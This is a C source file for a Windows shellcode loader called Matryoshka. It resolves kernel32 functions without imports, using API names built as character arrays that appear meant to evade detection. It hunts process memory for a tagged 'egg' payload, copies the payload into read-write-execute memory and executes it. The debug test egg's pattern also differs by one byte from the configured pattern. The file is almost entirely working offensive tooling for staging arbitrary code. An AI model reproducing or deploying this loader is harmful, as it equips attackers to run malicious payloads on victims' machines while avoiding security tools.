#pragma once

 //
 // Global Headers
 //

#include <Windows.h>

//
// Project Headers
//

#include "matryoshka.h"
#include "debug.h"

//
// Force MSVC to generate relative call instructions
//

#include "api.h"
#include "crt.h"

//
// Forward Declarations
//

BOOL MatryoshkaEntrypoint(matryoshka_loader_config_t* config);
matryoshka_egg_t* MatryoshkaHunter(matryoshka_loader_config_t* config, matryoshka_state* state);
BOOL MatryoshkaInitRuntime(matryoshka_state* state);
BOOL MatryoshkaRunStage(matryoshka_state* state, matryoshka_egg_t* egg);

#ifdef _DEBUG 
BYTE egg_test[] = { 
					// egg
					0xFF, 0x12, 0x6F, 0xDA, 
                    0xAB, 0x1C, 0x81, 0x9C, 

					// magic
	                0xCE, 0xFA, 0xED, 0xFE, 

					// size
	                0x04, 0x00, 0x00, 0x00, 

					// payload
	                0xCC, 0xCC, 0xCC, 0xCC 
				  };

int main() {
	matryoshka_loader_config_t config;

	config.magic = MATRYOSHKA_CONFIG_MAGIC;
	config.egg_pattern[0]  = 0xFF;
	config.egg_pattern[1]  = 0x12;
	config.egg_pattern[2]  = 0x6F;
	config.egg_pattern[3]  = 0xDA;
	config.egg_pattern[4]  = 0xAB;
	config.egg_pattern[5]  = 0x1C;
	config.egg_pattern[6]  = 0x81;
	config.egg_pattern[7]  = 0x9D;

	debug("[i] Egg_Test Address Is %p\n", egg_test);
	MatryoshkaEntrypoint(&config);
}
#endif

/**
 * @brief Entrypoint of the loader shellcode
 */
BOOL MatryoshkaEntrypoint(
	matryoshka_loader_config_t *config
)
{
	BOOL success = FALSE;
	matryoshka_state state = { 0 };

	if (config->magic != MATRYOSHKA_CONFIG_MAGIC) {
		debug("[-] Error: Invalid Configuration File Passed to Matryoshka Loader\n");
		return FALSE;
	}

    success = MatryoshkaInitRuntime(&state);
	if (success == FALSE) {
		debug("[-] Error unable to resolve required runtime dependencies\n");
		return FALSE;
	}

	matryoshka_egg_t *egg = MatryoshkaHunter(config, &state);
	if (egg == NULL) {
		debug("[-] Error unable to find the egg specified within the config file\n");
		return FALSE;
	}
	
	success = MatryoshkaRunStage(&state, egg);
	if (success == FALSE) {
		debug("[-] Error unable to execute payload\n");
		return FALSE;
	}

	return TRUE;
}

/**
 * @brief Execute the stager
 */
BOOL MatryoshkaRunStage(
	matryoshka_state* state,
	matryoshka_egg_t* egg
)
{
	PBYTE rwx = state->runtime.VirtualAlloc(NULL, 
				             egg->egg_size, 
		                     MEM_COMMIT, 
		                     PAGE_EXECUTE_READWRITE);

	if (rwx == NULL) {
		debug("[-] Failed to Allocate Memory for Payload Execution\n");
		return FALSE;
	}

	crt_memcpy(rwx, egg->stage, egg->egg_size);

	((void(*)())rwx)();

	return TRUE;
}

/**
 * @brief Egghunter that searches for egg pattern specified in the configuration file
 */
matryoshka_egg_t* MatryoshkaHunter(
	matryoshka_loader_config_t *config,
	matryoshka_state *state
)
{
	PBYTE MinAddress = 0x00000000;
	PBYTE position = MinAddress;
	MEMORY_BASIC_INFORMATION region = { 0 };

	do 
	{
		DWORD result = state->runtime.VirtualQuery(position, &region, sizeof(region));
		debug("[i] Base Address: %p, Result = %d\n", region.BaseAddress, result);

		if (result == 0) {
			debug("[-] Unable to find egg value (VirtualQuery failed)\n");
			return NULL;
		}

		if (region.State & MEM_COMMIT && region.AllocationProtect & ~PAGE_GUARD && region.Protect != PAGE_NOACCESS) {
			if (region.Type == MEM_MAPPED || region.Type == MEM_IMAGE) {
				PBYTE start = region.BaseAddress;
				PBYTE end = (PBYTE)region.BaseAddress + region.RegionSize;
				SIZE_T matched = 0;

				for (SIZE_T i = 0; i < region.RegionSize; i++) {
					matched = (start[i] == config->egg_pattern[matched]) ? matched += 1 : 0;

					if (matched == sizeof(config->egg_pattern)) {
						if (&start[i] + sizeof(matryoshka_egg_t) < end) {
							matryoshka_egg_t* egg = (matryoshka_egg_t*)&start[i + 1];
							if (egg->magic == MATRYOSHKA_EGG_MAGIC) {
								debug("start: %p\n", &start[i] - sizeof(config->egg_pattern) + 1);
								debug("egg_test: %p\n", &egg_test);
								debug("egg_size: %d\n", egg->egg_size);
								return &start[i + 1];
							}
							else {
								matched = 0;
							}
						}
					}
				}
			}
		}
		position = (PBYTE)region.BaseAddress + region.RegionSize;
	} while (position != MinAddress);

	return NULL;
}

/**
 * @brief Resolve addresses of external subroutine dependencies
 */
BOOL MatryoshkaInitRuntime(
	matryoshka_state *state
)
{
	PVOID kernel32base = NULL;
	wchar_t Kernel32WStr[]   = { 'K', 'E', 'R', 'N' ,'E' ,'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
	char GetProcAddressStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
	char LoadLibraryStr[]    = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };

	char Kernel32Str[]     = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
	char VirtualAllocStr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
	char VirtualQueryStr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', '\0' };
	char IsBadReadPtrStr[] = { 'I', 's', 'B', 'a', 'd', 'R', 'e', 'a', 'd', 'P', 't', 'r', '\0' };

	debug("[i] Resolving Core Runtime Routines\n");
	kernel32base = GetDllBaseAddr(Kernel32WStr);
	debug("Got Kernel32 Base Address: %p\n", kernel32base);

	if (kernel32base == NULL) {
		debug("[-] Error Unable to Resolve Address of Kernel32\n");
		return FALSE;
	}

	//
	// Resolve the address of LoadLibrary and GetProcAddress
	//

	state->runtime.GetProcAddress = GetAPIByName(kernel32base, &GetProcAddressStr);
	if (state->runtime.GetProcAddress == NULL) {
		debug("[-] Unable to resolve address of GetProcAddress\n");
		return FALSE;
	}

	state->runtime.LoadLibrary = GetAPIByName(kernel32base, &LoadLibraryStr);
	if (state->runtime.LoadLibrary == NULL) {
		debug("[-] Unable to resolve address of LoadLibraryA\n");
		return FALSE;
	}

	//
	// Resolve Matryoshka Runtime Dependencies
	//

	HMODULE kernel32 = state->runtime.LoadLibrary(Kernel32Str);
	if (kernel32 == NULL) {
		debug("[-] Failed when attempting to reference kernel32.dll from LoadLibrary\n");
		return FALSE;
	}

	state->runtime.IsBadReadPtr = state->runtime.GetProcAddress(kernel32, IsBadReadPtrStr);
	if (state->runtime.IsBadReadPtr == NULL) {
		debug("[-] Unable to resolve address of IsBadReadPtr\n");
		return FALSE;
	}

	state->runtime.VirtualAlloc = state->runtime.GetProcAddress(kernel32, VirtualAllocStr);
	if (state->runtime.VirtualAlloc == NULL) {
		debug("[-] Unable to resolve address of VirtualQuery\n");
		return FALSE;
	}

	state->runtime.VirtualQuery = state->runtime.GetProcAddress(kernel32, VirtualQueryStr);
	if (state->runtime.VirtualQuery == NULL) {
		debug("[-] Unable to resolve address of VirtualQuery\n");
		return FALSE;
	}

	return TRUE;
}